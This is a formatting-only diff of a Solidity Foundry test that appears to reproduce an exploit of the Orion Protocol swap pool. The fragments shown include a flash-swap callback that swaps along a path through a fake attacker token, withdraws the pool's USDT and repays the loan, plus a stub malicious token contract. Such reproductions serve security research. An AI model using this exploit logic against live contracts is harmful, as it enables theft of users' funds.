@@ -18,8 +18,9 @@ import "./interface.sol";
 
 interface OrionPoolV2Factory {
     function createPair(address tokenA, address tokenB) external;
-    function getPair(address tokenA, address tokenB) external view returns(address);
+    function getPair(address tokenA, address tokenB) external view returns (address);
 }
+
 interface ORION {
     function swapThroughOrionPool(
         uint112 amount_spend,
@@ -73,7 +74,7 @@ contract ContractTest is Test {
 
         emit log_named_decimal_uint(
             "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
-            );
+        );
     }
 
     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
@@ -83,7 +84,9 @@ contract ContractTest is Test {
         path[2] = address(USDT);
         Orion.swapThroughOrionPool(10_000, 0, path, true);
         Orion.withdraw(address(USDT), uint112(USDT.balanceOf(address(Orion)) - 1));
-        address(USDT).call(abi.encodeWithSignature("transfer(address,uint256)", address(Pair), flashAmount * 1000 / 997 + 1000));
+        address(USDT).call(
+            abi.encodeWithSignature("transfer(address,uint256)", address(Pair), flashAmount * 1000 / 997 + 1000)
+        );
     }
 
     function addLiquidity() internal {
@@ -171,7 +174,7 @@ contract ATKToken is IERC20 {
         emit Transfer(msg.sender, address(0), amount);
     }
 
-    function withdraw(uint256 wad) external{}
-    function deposit(uint256 wad) external returns (bool){}
-    function owner() external view returns (address){}
+    function withdraw(uint256 wad) external {}
+    function deposit(uint256 wad) external returns (bool) {}
+    function owner() external view returns (address) {}
 }
